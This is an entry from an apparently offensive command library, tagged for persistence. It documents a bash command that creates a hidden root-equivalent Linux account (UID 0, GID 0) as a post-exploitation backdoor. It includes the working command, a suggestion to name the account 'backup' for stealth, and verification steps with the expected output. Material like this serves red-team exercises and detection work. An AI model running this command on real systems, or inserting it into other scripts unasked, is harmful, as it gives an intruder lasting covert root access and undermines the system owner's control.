---
id: b448dae6-aa7e-4a8c-8f42-49c98eea1e01-part1
name: useradd-create-root-user
type: command
executor: bash
data: sudo useradd -ou 0 -g 0 $_USERNAME
output: null
created_at: '2023-04-06T03:56:17.905762+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - persistence
  - account-creation
verified: true
validated: true
---

# useradd-create-root-user

## Command

```bash
sudo useradd -ou 0 -g 0 $_USERNAME
```

## Description

Creates a new user account with root privileges (UID 0 and GID 0) on a Linux system, enabling persistence without altering the primary root account. Use this in post-exploitation to establish a backdoor user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | The desired username for the new root-equivalent account (e.g., 'backup' for stealth) | Yes |
| -o | Allows duplicate UID (non-unique root UID) | Built-in |
| -g 0 | Sets primary group to root (GID 0) | Built-in |

## Examples

### Basic Usage

```bash
sudo useradd -ou 0 -g 0 backup
```

### Verification

After execution, verify with:
```bash
id backup
```
Output: uid=0(root) gid=0(root) groups=0(root)

## Expected Output

No output on success (silent execution). If the user already exists, error: "useradd: user '$_USERNAME' already exists". Check /etc/passwd for the new entry: `$_USERNAME:x:0:0::/home/$_USERNAME:/bin/bash`.

## Related

- [[procedures/Linux-Add-Root-User-Persistence]]
